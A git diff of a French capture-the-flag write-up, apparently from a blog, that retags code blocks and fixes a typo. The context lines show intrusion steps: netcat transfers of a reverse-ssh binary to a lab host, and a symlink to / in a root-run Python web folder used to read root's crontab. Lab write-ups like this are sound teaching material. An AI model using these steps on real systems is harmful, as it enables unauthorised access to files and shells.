@@ -275,13 +275,13 @@ Connection to 192.168.101.1 22 port [tcp/ssh] succeeded!
 
 Le trafic entrant n'a pas ce type de restrictions alors il suffit de mettre en port en écoute et une redirection :  
 
-```bash
+```console
 $ nc -l -p 9999 > /tmp/reverse-sshx64
 ```
 
 et on envoie la sauce :  
 
-```bash
+```console
 $ ncat 192.168.101.128 9999 -v < /tmp/reverse-sshx64
 ```
 
@@ -321,13 +321,13 @@ root        8874  0.1  0.2  16280  9196 ?        S    11:45   0:00          _ /u
 
 Détail amusant, le serveur web de Python est exécuté en root et livre un dossier sur lequel on a le contrôle. C'est l'occasion de tester un petit lien symbolique histoire de voir si Python le suit.  
 
-```bash
+```console
 $ ln -s / disk
 ```
 
 Et effectivement, c'est le cas !  
 
-Je peux par exemple lire la contab de root à l'adresse `http://192.168.101.128:10123/disk/var/spool/cron/crontabs/root` :  
+Je peux par exemple lire la crontab de root à l'adresse `http://192.168.101.128:10123/disk/var/spool/cron/crontabs/root` :  
 
 ```
 # m h  dom mon dow   command
